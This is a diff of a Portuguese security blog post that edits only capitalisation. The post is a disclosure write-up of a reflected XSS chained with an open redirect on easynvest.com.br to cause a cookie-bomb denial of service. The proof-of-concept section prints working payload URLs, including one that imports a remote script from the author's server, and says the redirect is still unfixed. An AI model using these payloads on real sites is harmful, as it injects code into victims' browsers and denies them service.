@@ -1,6 +1,6 @@
 ---
 layout: content
-title: 'Encadeamento de vulnerabilidades client-side para geração de Indisponibilidade em aplicação web'
+title: 'Encadeamento de vulnerabilidades client-side para geração de indisponibilidade em aplicação web'
 description: 'Durante uma análise na aplicação web da corretora easynvest.com.br (adquirida pelo Nubank), foram identificadas duas vulnerabilidades client-side que, quando exploradas em conjunto, podem colocar em risco a disponibilidade do serviço para usuários legítimos. Especificamente, observou-se a possibilidade de provocar uma condição de negação de serviço (DoS) a partir da combinação dessas falhas.'
 og_image: https://heitorgouvea.me/images/publications/nuinvest/xss-triaged.png
 ---
@@ -46,17 +46,17 @@ Apesar da presença da vulnerabilidade, sua exploração direta apresenta limita
 * Trata-se de um XSS do tipo "refletido", dificultando a disseminação automática do payload;
 * O domínio principal da aplicação apresenta mecanismos robustos de segurança, incluindo tokens anti-CSRF e cabeçalhos HTTP como X-Frame-Options (XFO), Content Security Policy (CSP) e Cross-Origin Resource Sharing (CORS) devidamente configurados.
 
-Dada a limitação do XSS refletido isolado, buscou-se identificar outra vulnerabilidade que pudesse ser combinada para amplificar o impacto. A análise do código JavaScript da tela de autenticação revelou a presença de uma vulnerabilidade de Open Redirect ([3], [4]):
+Dada a limitação do XSS refletido isolado, buscou-se identificar outra vulnerabilidade que pudesse ser combinada para amplificar o impacto. A análise do código JavaScript da tela de autenticação revelou a presença de uma vulnerabilidade de open redirect ([3], [4]):
 
 [https://www.easynvest.com.br/autenticacao?redirect_url=https://google.com]()
 
 Demo:
 
-<iframe width="100%" height="523" src="https://www.youtube.com/embed/sN1J3py9aUo" title="Open Redirect - Easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<iframe width="100%" height="523" src="https://www.youtube.com/embed/sN1J3py9aUo" title="Open redirect - Easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
 Esse redirecionamento não validado, localizado no domínio principal da aplicação, permite a disseminação de cargas maliciosas de forma mais confiável, mitigando parcialmente as restrições impostas pelo XSS refletido. No entanto, tentativas de exploração com objetivos mais críticos — como Account Takeover, exfiltração de dados ou execução de ações sensíveis — foram ineficazes devido à implementação de autenticação multifator (MFA) para operações de maior risco ([7]).
 
-Considerando essas restrições, avaliou-se a viabilidade de um vetor alternativo: o ataque do tipo Cookie Bomb, cujo objetivo é tornar a aplicação indisponível para o usuário que interagir com um link malicioso. Esse ataque consiste na inserção massiva de cookies com carga excessiva, excedendo os limites aceitáveis pelo servidor. Como resultado, o servidor pode recusar as requisições subsequentes oriundas do navegador comprometido, impedindo o carregamento da aplicação e, consequentemente, gerando uma condição de negação de serviço (DoS).
+Considerando essas restrições, avaliou-se a viabilidade de um vetor alternativo: o ataque do tipo cookie bomb, cujo objetivo é tornar a aplicação indisponível para o usuário que interagir com um link malicioso. Esse ataque consiste na inserção massiva de cookies com carga excessiva, excedendo os limites aceitáveis pelo servidor. Como resultado, o servidor pode recusar as requisições subsequentes oriundas do navegador comprometido, impedindo o carregamento da aplicação e, consequentemente, gerando uma condição de negação de serviço (DoS).
 
 De modo geral, navegadores permitem o envio de múltiplos cookies, cada um com limite aproximado de 4KB. Contudo, servidores web podem falhar ao processar esse volume excessivo de dados, causando indisponibilidade até que os cookies sejam removidos manualmente pelo usuário, ou expirem.
 
@@ -65,7 +65,7 @@ Para um entendimento aprofundado desse tipo de ataque, recomenda-se a leitura do
 
 ---
 
-### Prova de Conceito
+### Prova de conceito
 
 A seguir, descreve-se a cadeia de exploração:
 
@@ -88,13 +88,13 @@ window.location="https://" + document.domain;
 
 [https://indique.easynvest.com.br/?nome=><audio src="" onerror=import('//heitorgouvea.me/public/payloads/bomb.js');>&id=1]()
 
-3. Encaminhamento do usuário via Open Redirect, utilizando um serviço de encurtamento de URLs para mascarar o payload: [https://cutt.ly/syPnJXp]()
+3. Encaminhamento do usuário via open redirect, utilizando um serviço de encurtamento de URLs para mascarar o payload: [https://cutt.ly/syPnJXp]()
 
 Payload final: [https://easynvest.com.br/autenticacao?redirect_url=https://cutt.ly/syPnJXp]()
 
 E esse é o resultado:
 
-<iframe width="100%" height="523" src="https://www.youtube.com/embed/-L2pl1Ke_Lo" title="Cookie Bomb - easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<iframe width="100%" height="523" src="https://www.youtube.com/embed/-L2pl1Ke_Lo" title="Cookie bomb - easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
 ---
 
@@ -106,11 +106,11 @@ A cadeia de exploração permite que um atacante cause indisponibilidade localiz
 
 ### Conclusão
 
-A exploração demonstrada exige baixo esforço técnico e operacional, porém pode gerar impacto significativo ao usuário final. A utilização combinada de um XSS refletido e um Open Redirect viabiliza um ataque de negação de serviço via Cookie Bomb, um vetor pouco comum, porém eficaz em contextos específicos.
+A exploração demonstrada exige baixo esforço técnico e operacional, porém pode gerar impacto significativo ao usuário final. A utilização combinada de um XSS refletido e um open redirect viabiliza um ataque de negação de serviço via cookie bomb, um vetor pouco comum, porém eficaz em contextos específicos.
 
 Após contato com a empresa, foram adotadas as seguintes medidas:
 
-* Não foi implementada uma correção definitiva para a vulnerabilidade de Open Redirect;
+* Não foi implementada uma correção definitiva para a vulnerabilidade de open redirect;
 * A mitigação do XSS refletido foi realizada por meio de regras no Web Application Firewall (WAF), embora tenham sido identificadas formas de contornar essa proteção. Argumentações técnicas foram apresentadas à empresa, sem retorno conclusivo até o momento.
 
 ---
